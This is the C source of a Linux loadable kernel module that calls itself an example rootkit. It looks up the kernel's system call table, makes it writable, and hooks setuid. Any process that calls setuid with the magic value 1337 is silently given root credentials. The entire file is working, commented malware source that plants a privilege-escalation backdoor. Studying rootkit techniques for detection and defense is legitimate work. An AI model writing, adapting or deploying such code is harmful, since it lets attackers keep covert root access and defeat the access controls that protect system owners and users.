/* An example rootkit that gives a rootshell to a userland process */

#include <asm/unistd.h>
#include <asm/cacheflush.h>
#include <asm/pgtable_types.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/fs.h>
#include <linux/sched.h>
#include <linux/moduleparam.h>
#include <linux/kallsyms.h>
#include <linux/cred.h>

#define MA "@Pink_P4nther"
#define MD "Example Rootkit"
#define ML "GPL"
#define MV "1.0"

/* Sycall table address */
void **sct_address;

/* Set sys_call_table address to sct_address */
void set_sct_addr(void);

/* Setuid syscall hook */
asmlinkage int (*origin_suidcall) (uid_t uid);

/* Malicious setuid hook syscall */
asmlinkage int mal_suidcall(uid_t uid)
{
	if (uid == 1337)
	{
		/* Create new cred struct */
		struct cred *np;
		/* Create uid struct */
		kuid_t nuid;
		/* Set uid struct value to 0 */
		nuid.val = 0;
		/* Print UID and EUID of current process to dmesg */
		printk(KERN_INFO "[+] UID = %hu\n[+] EUID = %hu",current->cred->uid,current->cred->euid);
		printk(KERN_WARNING "[!] Attempting UID change!");
		/* Prepares new set of credentials for task_struct of current process */
		np = prepare_creds();
		/* Set uid of new cred struct to 0 */
		np->uid = nuid;
		/* Set euid of new cred struct to 0 */
		np->euid = nuid;
		/* Commit cred to task_struct of process */
		commit_creds(np);
		printk(KERN_WARNING "[!] Changes Complete!");
	}
	/* Call original setuid syscall */
	return origin_suidcall(uid);
}

/* Set SCT Address */
void set_sct_addr(void)
{
	/* Lookup address for sys_call_table and set sct_address to it */
	sct_address = (void*)kallsyms_lookup_name("sys_call_table");
}

/* Make SCT writeable */
int sct_w(unsigned long sct_addr)
{
	unsigned int level;
	pte_t *pte = lookup_address(sct_addr,&level);
	if (pte->pte &~_PAGE_RW)
	{
		pte->pte |=_PAGE_RW;
	}
	return 0;
}

/* Make SCT write protected */
int sct_xw(unsigned long sct_addr)
{
	unsigned int level;
	pte_t *pte = lookup_address(sct_addr, &level);
	pte->pte = pte->pte &~_PAGE_RW;
	return 0;
}

/* Loads LKM */
static int __init hload(void)
{
	/* Set syscall table address */
	set_sct_addr();

	/* Set the address to the setuid call to our origin setuid call */
	origin_suidcall = sct_address[__NR_setuid];

	/* Make SCT writeable */
	sct_w((unsigned long)sct_address);
	
	/* Hook the setuid call (Write our malicious syscall's address in place of
	 * the original setuid syscall's address)
	 */
	sct_address[__NR_setuid] = mal_suidcall;

	return 0;
}

/* Unloads LKM */
static void __exit hunload(void)
{
	/* Rewrite the old setuid syscall address back into the SCT page */
	sct_address[__NR_setuid] = origin_suidcall;

	/* Make SCT page write protected */
	sct_xw((unsigned long)sct_address);
}

module_init(hload);
module_exit(hunload);

MODULE_LICENSE(ML);
MODULE_AUTHOR(MA);
MODULE_DESCRIPTION(MD);
MODULE_VERSION(MV);
